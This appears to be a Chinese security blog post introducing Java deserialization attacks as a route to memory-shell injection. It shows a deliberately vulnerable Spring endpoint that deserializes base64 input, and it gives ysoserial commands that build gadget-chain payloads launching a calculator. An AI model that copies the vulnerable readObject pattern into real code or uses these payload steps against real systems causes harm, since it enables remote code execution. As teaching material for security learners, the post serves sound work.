---
title: 反序列化漏洞进阶
date: 2026-01-27 07:09:28
updated: 2026-01-27 07:25:32
tags:
  - Web
  - java
  - 反序列化
---
# 1.利用反序列化漏洞打入内存马

## 1.1漏洞代码

如图所示将前端传递过来的base64解码然后反序列化。这是一个典型的反序列化漏洞。

```plain
    @ApiOperation(value = "vul：readObject反序列化")
    @RequestMapping("/vul")
    public String readObject(String base64) {
        try {
            log.info("[vul] 执行反序列化：" + base64);
            base64 = base64.replace(" ", "+");

            byte[] bytes = Base64.getDecoder().decode(base64);

            // 将字节转为输入流
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);

            // 反序列化流，将序列化的原始数据恢复为对象
            java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);
            in.readObject();
            in.close();
            return "反序列化漏洞";
        } catch (Exception e) {
            return "Payload：java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 \"open -a Calculator\" | base64";
        }
    }
```

## 1.2反序列化poc生成

github地址：[https://github.com/woodpecker-framework/ysoserial-for-woodpecker](https://github.com/woodpecker-framework/ysoserial-for-woodpecker)

```plain
java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "raw_cmd:calc.exe"
```

将输出的二进制文件base64编码请求/vul接口即可执行命令。